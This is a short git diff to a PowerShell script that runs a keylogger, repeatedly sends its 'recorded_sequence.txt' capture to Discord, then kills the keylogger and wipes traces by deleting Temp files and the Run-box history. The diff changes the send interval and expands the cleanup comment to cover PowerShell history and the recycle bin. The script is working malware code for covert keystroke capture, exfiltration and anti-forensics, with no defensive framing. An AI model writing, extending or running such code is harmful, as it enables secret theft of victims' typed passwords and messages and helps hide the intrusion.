@@ -51,7 +51,7 @@ try {
     # Wait 10 seconds before sending the first message to discord
     Start-Sleep -Seconds 10
 
-    # Send the recorded_sequence.txt to Discord every 5 seconds, a maximum of 10 times
+    # Send the recorded_sequence.txt to Discord every 15 seconds, a maximum of 10 times
     $maxSendCount = 10
     $sendCount = 0
     while ($sendCount -lt $maxSendCount) {
@@ -65,15 +65,15 @@ try {
         # Increase the send count
         $sendCount++
 
-        # Sleep for 5 seconds
-        Start-Sleep -Seconds 5
+        # Sleep for 15 seconds
+        Start-Sleep -Seconds 15
     }
 
     # End the keylogger process
     Write-Host "Stopping keylogger..."
     Get-Process -Name 'keylogger' | ForEach-Object { Stop-Process -Id $_.Id -Force }
 
-    # Cleanup
+    # Cleanup: Delete contents of Temp folder, run box history, PowerShell history, and recycle bin
     Write-Host "Performing cleanup..."
     Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
     Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name '*' -ErrorAction SilentlyContinue
